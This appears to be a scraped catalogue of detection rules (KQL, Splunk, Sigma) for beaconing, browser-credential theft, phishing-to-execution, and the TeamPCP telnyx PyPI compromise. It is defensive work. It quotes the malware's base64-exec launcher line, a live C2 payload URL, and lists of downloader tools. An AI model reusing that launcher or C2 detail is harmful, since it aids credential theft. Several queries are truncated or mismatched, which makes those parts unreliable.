    | where Timestamp > ago(30d)
    | where SHA256 in (_iocHashes)
       or (FileName =~ "7WhiteSmoke.msi")
       or (FileName =~ "1.bat" and FolderPath has_any (@"\Temp\", @"\AppData\Local\Temp\"))
    | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, Indicator=strcat(FileName," / ",SHA256), InitiatingProcessFileName, InitiatingProcessCommandLine, Source="File";
union Net, Dns, Files
| order by Timestamp desc
let _iocHashes = dynamic(["fcd398abc51fd16e8bc93ef8d88a23d7dec28081b6dfce4b933020322a610508","e903ae267bf7ed1d02b218c1dc7cf6d87257e87de9fbda411a13f9154716bfa3","5f9c09c2c432a6b94f2200455065bcfd1237f8a01b913a7c9e37f164ff99a84c"]);
let _iocDomains = dynamic(["rraghh.com","oortt.com","cdn.rraghh.com"]);
let Web = ImWebSession
    | where TimeGenerated > ago(30d)
    | where Url has_any (_iocDomains) or DstHostname has_any (_iocDomains)
    | project TimeGenerated, Computer=DvcHostname, User=SrcUsername, Indicator=Url, Source="WebSession";
let Dns = ImDnsActivity
    | where TimeGenerated > ago(30d)
    | where DnsQuery endswith "rraghh.com" or DnsQuery endswith "oortt.com"
    | project TimeGenerated, Computer=DvcHostname, User=SrcUsername, Indicator=DnsQuery, Source="DNS";
let Files = ImFileEvent
    | where TimeGenerated > ago(30d)
    | where TargetFileSHA256 in (_iocHashes)
       or TargetFileName =~ "7WhiteSmoke.msi"
       or (TargetFileName =~ "1.bat" and TargetFilePath has "\\Temp\\")
    | project TimeGenerated, Computer=DvcHostname, User=ActorUsername, Indicator=strcat(TargetFileName," / ",TargetFileSHA256), Source="File";
union Web, Dns, Files
| order by TimeGenerated desc
title: IoliteLabs VSCode Backdoor - DNS Query for rraghh.com or oortt.com C2

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Google\Chrome\User Data\", @"\Microsoft\Edge\User Data\", @"\Mozilla\Firefox\Profiles\")
| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

// ASIM ImFileEvent — covers MDE, Sysmon, AuditD, Defender for Cloud, etc.
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where TargetFilePath has_any (@"\Google\Chrome\User Data\",
                                  @"\Microsoft\Edge\User Data\",
                                  @"\Mozilla\Firefox\Profiles\")
| where TargetFileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where ActingProcessName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          TargetFilePath, TargetFileName, EventType

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`

title: Obfuscated / Encoded PowerShell Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d08
status: experimental
description: |

Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("fcd398abc51fd16e8bc93ef8d88a23d7dec28081b6dfce4b933020322a610508", "e903ae267bf7ed1d02b218c1dc7cf6d87257e87de9fbda411a13f9154716bfa3") or SHA1 in~ ("fcd398abc51fd16e8bc93ef8d88a23d7dec28081b6dfce4b933020322a610508", "e903ae267bf7ed1d02b218c1dc7cf6d87257e87de9fbda411a13f9154716bfa3") or MD5 in~ ("fcd398abc51fd16e8bc93ef8d88a23d7dec28081b6dfce4b933020322a610508", "e903ae267bf7ed1d02b218c1dc7cf6d87257e87de9fbda411a13f9154716bfa3")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("fcd398abc51fd16e8bc93ef8d88a23d7dec28081b6dfce4b933020322a610508", "e903ae267bf7ed1d02b218c1dc7cf6d87257e87de9fbda411a13f9154716bfa3") or SHA1 in~ ("fcd398abc51fd16e8bc93ef8d88a23d7dec28081b6dfce4b933020322a610508", "e903ae267bf7ed1d02b218c1dc7cf6d87257e87de9fbda411a13f9154716bfa3") or MD5 in~ ("fcd398abc51fd16e8bc93ef8d88a23d7dec28081b6dfce4b933020322a610508", "e903ae267bf7ed1d02b218c1dc7cf6d87257e87de9fbda411a13f9154716bfa3")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["fcd398abc51fd16e8bc93ef8d88a23d7dec28081b6dfce4b933020322a610508", "e903ae267bf7ed1d02b218c1dc7cf6d87257e87de9fbda411a13f9154716bfa3"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Critical

TeamPCP Plants WAV Steganography Credential Stealer in telnyx PyPI Package

StepSecurity
2026-04-02 12 use cases 4 techniques 6 kill-chain phases detected

On March 27, 2026, TeamPCP injected a WAV steganography-based credential stealer into two releases of the telnyx Python SDK on PyPI. The issue was disclosed in team-telnyx/telnyx-python#235. TeamPCP is the same group behind the litellm supply chain compromise three days earlier, identified by a shared RSA-4096 public key, identical encryption scheme, and the tpcp.tar.gz exfiltration signature present in both attacks.

ATT&CKT1027 T1190 T1195.002 T1555.003
IPs83.142.209.203

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] pip install of malicious telnyx versions 4.87.1 / 4.87.2 · Phishing-link click correlated to endpoint execution
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — TeamPCP Plants WAV Steganography Credential Stealer in telnyx PyPI Package
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] TeamPCP telnyx FetchAudio() — python subprocess running inline base64 exec · [LLM] msbuild.exe dropped to Startup folder (TeamPCP telnyx Windows persistence)
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Outbound connection to TeamPCP C2 83.142.209.203 / ringtone.wav stego payload fetch · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] TeamPCP exfiltration archive tpcp.tar.gz created on disk
[LLM] TeamPCP telnyx FetchAudio() — python subprocess running inline base64 exec Installation High
Detects the FetchAudio() module-level trigger from telnyx 4.87.1/4.87.2 supply-chain compromise: spawns a detached `python -c "import base64; exec(base64.b64decode('...').decode())"` subprocess that decodes the embedded `_p` blob and runs the Linux/macOS credential harvester. The exact cmdline shape (literal `import base64; exec(base64.b64decode(`) is article-specific and was emitted verbatim by the malicious _client.py. Rationale: Anchored on the verbatim `subprocess.Popen([sys.executable, "-c", f"import base64; exec(base64.b64decode('{_p}').decode())"])` shape shown in the article's FetchAudio() body — this exact one-liner is the only execution vector used to detonate the Linux/macOS payload, so the dual-keyword cmdline match is high-fidelity for this campaign and other PyPI stealers using the same `_p` blob trick. Cross-checked against: • https://github.com/team-telnyx/telnyx-python/issues/235 • https://www.stepsecurity.io/blog/teampcp-plants-wav-steganography-credential-stealer-in-telnyx-pypi-package
ATT&CKT1059.006 T1027.013 T1195.002
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName has_any ("python","python3","python.exe","python3.exe","pythonw.exe")
| where ProcessCommandLine has "import base64" and ProcessCommandLine has "exec(base64.b64decode"
| where InitiatingProcessFileName has_any ("python","python3","python.exe","python3.exe")
   or InitiatingProcessParentFileName has_any ("python","python3","python.exe","python3.exe")
   or InitiatingProcessCommandLine has "import telnyx"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("python","python3","python.exe","python3.exe","pythonw.exe")
| where ActingProcessCommandLine has "import base64" and ActingProcessCommandLine has "exec(base64.b64decode"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,
          ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc
title: TeamPCP telnyx Supply Chain — Python Base64 Exec Subprocess
id: c1a8b3e4-7d56-4f8a-9b2c-1e2f3d4a5b6c
status: experimental
description: Detects the FetchAudio() pattern from telnyx 4.87.1/4.87.2 supply-chain compromise where the trojan spawns python -c with an inline base64+exec one-liner to detonate the Linux/macOS credential harvester.
references:
  - https://www.stepsecurity.io/blog/teampcp-plants-wav-steganography-credential-stealer-in-telnyx-pypi-package
  - https://github.com/team-telnyx/telnyx-python/issues/235
author: SOC Detection Engineering
date: 2026/03/27
tags:
  - attack.execution
  - attack.t1059.006
  - attack.t1027
  - attack.t1195.002
logsource:
  category: process_creation
detection:
  selection_proc:
    Image|endswith:
      - '/python'
      - '/python3'
      - '\\python.exe'
      - '\\python3.exe'
      - '\\pythonw.exe'
  selection_cmd:
    CommandLine|contains|all:
      - 'import base64'
      - 'exec(base64.b64decode'
  condition: selection_proc and selection_cmd
falsepositives:
  - CI runners decoding base64-packed secrets into temp scripts
  - Pyinstaller bootloader stubs (rare; check parent)

[LLM] Outbound connection to TeamPCP C2 83.142.209.203 / ringtone.wav stego payload fetch Command & Control High
Detects the urllib.request fetch to `http://83.142.209.203:8080/ringtone.wav` performed by the audioimport() payload after the FetchAudio() subprocess decodes `_p`. The IP+port+path is unique to the TeamPCP telnyx campaign and shared with the litellm compromise three days earlier (same RSA-4096 key, same exfil signature). Rationale: Anchored on the literal IOC pair from the article: IP `83.142.209.203` on port 8080, GET path `/ringtone.wav`, fetched via urllib.request with `Mozilla/5.0` User-Agent. The IP is unique to TeamPCP infrastructure (StepSecurity ties it to the litellm campaign via shared RSA-4096 key + tpcp.tar.gz exfil signature), so any contact is essentially a confirmed campaign hit. Cross-checked against: • https://www.stepsecurity.io/blog/teampcp-plants-wav-steganography-credential-stealer-in-telnyx-pypi-package • https://github.com/team-telnyx/telnyx-python/issues/235

[LLM] msbuild.exe dropped to Startup folder (TeamPCP telnyx Windows persistence) Installation High
Detects the Windows persistence step from the telnyx 4.87.2 setup() function — a binary masquerading as `msbuild.exe` written to the user's Startup folder (`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe`). Legitimate msbuild.exe ships under Program Files or the .NET SDK install dirs, never Startup. Rationale: Anchored on the article's explicit persistence mechanism: `setup()` (the Windows branch of the attack) drops a binary disguised as `msbuild.exe` into the Startup folder. The legitimate msbuild.exe never lives in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` — it ships in `C:\Program Files\Microsoft Visual Studio\` or `C:\Program Files\dotnet\sdk\` — so a name+path match is essentially zero-FP. Cross-checked against: • https://www.stepsecurity.io/blog/teampcp-plants-wav-steganography-credential-stealer-in-telnyx-pypi-package • https://attack.mitre.org/techniques/T1547/001/
ATT&CKT1547.001 T1036.005 T1195.002
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileRenamed","FileModified")
| where FileName =~ "msbuild.exe"
| where FolderPath has @"\Startup\"
   or FolderPath has @"\Start Menu\Programs\Startup\"
   or FolderPath has @"\Microsoft\Windows\Start Menu\Programs\Startup"
| project Timestamp, DeviceName, FileName, FolderPath, SHA256,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in ("FileCreated","FileModified","FileRenamed")
| where TargetFileName =~ "msbuild.exe"
| where TargetFilePath has @"\Startup\" or TargetFilePath has @"\Start Menu\Programs\Startup"
| project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath,
          TargetFileSHA256, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

[LLM] TeamPCP exfiltration archive tpcp.tar.gz created on disk Actions on Objectives High
Detects creation of the `tpcp.tar.gz` exfiltration archive — the named exfil signature shared between the telnyx 4.87.x compromise and the prior litellm campaign by the same TeamPCP actor. This is the AES-256-CBC/RSA-4096 encrypted credential bundle the harvester stages before upload. Rationale: The article calls out `tpcp.tar.gz` by name as the shared exfiltration signature across both TeamPCP supply-chain campaigns (telnyx + litellm) — alongside the shared RSA-4096 public key and identical encryption scheme used for attribution. An exact filename match on this string is essentially an attribution-grade indicator with near-zero legitimate use. Cross-checked against: • https://www.stepsecurity.io/blog/teampcp-plants-wav-steganography-credential-stealer-in-telnyx-pypi-package

[LLM] pip install of malicious telnyx versions 4.87.1 / 4.87.2 Delivery High
Detects installation of the two compromised telnyx PyPI releases (4.87.1 and 4.87.2) via pip — the supply-chain inflection point before any other detection in this campaign fires. Either explicit version pinning or a `pip install --upgrade telnyx` that resolves to the bad release. Rationale: Anchored on the article's two named malicious versions (4.87.1 and 4.87.2) of the telnyx PyPI package — the only releases that contain the FetchAudio/setup payloads. The last clean release was 4.87.0. A pip install matching both the package name AND one of those exact versions is a confirmed supply-chain compromise event with no legitimate use case. Cross-checked against: • https://www.stepsecurity.io/blog/teampcp-plants-wav-steganography-credential-stealer-in-telnyx-pypi-package • https://github.com/team-telnyx/telnyx-python/issues/235 • https://pypi.org/project/telnyx/
ATT&CKT1195.002 T1059.006

DeviceProcessEvents
| where Timestamp > ago(60d)
| where (FileName has_any ("pip","pip3","pip.exe","pip3.exe"))
   or (FileName has_any ("python","python3","python.exe","python3.exe") and ProcessCommandLine has "-m pip")
| where ProcessCommandLine has "install"
| where ProcessCommandLine has "telnyx"
| where ProcessCommandLine has_any ("4.87.1","4.87.2")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,

| where ActingProcessCommandLine has "telnyx"
| where ActingProcessCommandLine has_any ("4.87.1","4.87.2")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

[LLM] Outbound DNS/HTTPS to TeamPCP exfil domain models.litellm.cloud (litellm PyPI compromise) Command & Control High
